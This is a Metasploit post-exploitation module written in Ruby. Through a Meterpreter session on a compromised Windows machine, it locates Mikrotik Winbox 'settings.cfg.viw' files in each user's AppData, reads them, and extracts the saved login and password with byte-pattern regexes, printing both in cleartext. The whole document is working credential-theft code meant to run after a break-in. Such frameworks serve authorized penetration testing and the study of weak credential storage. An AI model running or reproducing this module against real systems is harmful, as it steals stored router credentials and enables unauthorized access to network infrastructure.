##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Common
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super(
      update_info(
        info,
        'Name'          => 'Windows Gather Mikrotik Winbox "Keep Password" Credentials Extractor',
        'Description'   => %q{ This module extracts Mikrotik Winbox credentials saved in the
          "settings.cfg.viw" file when the "Keep Password" option is
          selected in Winbox.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Pasquale \'sid\' Fiorillo' ], # www.pasqualefiorillo.it - Thanks to: www.isgroup.biz
        'Platform'      => [ 'win', ],
        'SessionTypes'  => [ 'meterpreter' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_write
              stdapi_fs_stat
            ]
          }
        }
      )
    )

    register_options(
      [
        OptBool.new('VERBOSE', [false, 'HexDump settings.cfg.viw files', false])
      ]
    )
  end

  def run
    print_status("VERBOSE: #{datastore['VERBOSE']}")
    print_status('Checking Default Locations...')
    grab_user_profiles.each do |user|
      next if user['AppData'].nil?

      check_appdata(user['AppData'] + '\\Mikrotik\\Winbox\\settings.cfg.viw')
    end
  end

  def check_appdata(path)
    client.fs.file.stat(path)
    print_good("Found File at #{path}")
  
    if datastore['VERBOSE']
      print_hexdump(path)
    end

    parse(path)
  rescue StandardError
    print_status("#{path} not found ....")
  end

  def print_hexdump(path)
    file = client.fs.file.new(path, 'rb')
    while (chunk = file.read(16))
      hex_values = chunk.each_byte.map { |b| sprintf('%02x', b) }.join(' ')
      ascii_values = chunk.gsub(/[^[:print:]]/, '.')
      print_status("#{hex_values.ljust(48)} #{ascii_values}")
    end
  rescue EOFError
  rescue Errno::ENOENT
    print_error("File not found: #{path}")
  rescue => e
    print_error("An error occurred: #{e.message}")
  end

  def parse(path)
    file = client.fs.file.new(path, 'rb')
    buffer = file.read()

    login = buffer.match(/\x00\x05login(.*)\x08\x00/)
    print_good("Login: #{login[1]}")

    password = buffer.match(/\x00\x03pwd(.*)\x0B\x00/)
    print_good("Password: #{password[1]}")
  rescue EOFError
  rescue Errno::ENOENT
    print_error("File not found: #{path}")
  rescue => e
    print_error("An error occurred: #{e.message}")
  end
    
end
